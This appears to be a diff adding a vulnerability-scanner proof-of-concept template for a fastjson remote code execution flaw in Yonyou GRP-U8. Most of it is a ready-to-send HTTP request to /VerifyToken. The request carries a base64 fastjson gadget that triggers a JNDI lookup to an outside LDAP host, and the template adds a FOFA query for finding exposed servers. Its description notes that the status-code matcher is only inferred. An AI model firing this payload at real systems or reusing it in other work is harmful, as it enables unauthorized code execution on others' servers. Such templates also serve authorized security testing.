@@ -1,0 +1,38 @@
+id: poc-pgxhkrivg6aw2xv4
+info:
+  name: 用友GRP-U8存在fastjson远程代码执行漏洞(XVE-2024-8863)
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pgxhkrivg6aw2xv4
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pgxhkrivg6aw2xv4
+    fofa: app="用友-GRP-U8"
+http:
+- raw:
+  - 'POST /VerifyToken HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    PARAM=eyJuYW1lIjp7IkB0eXBlIjoiamF2YS5sYW5nLkNsYXNzIiwidmFsIjoiY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGwifSwieCI6eyJAdHlwZSI6ImNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBsIiwiZGF0YVNvdXJjZU5hbWUiOiJsZGFwOi8vMjIyMjIubGRiY3d1ZXZiYS5kZ3JoMy5jbiIsImF1dG9Db21taXQiOnRydWV9fQ=='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
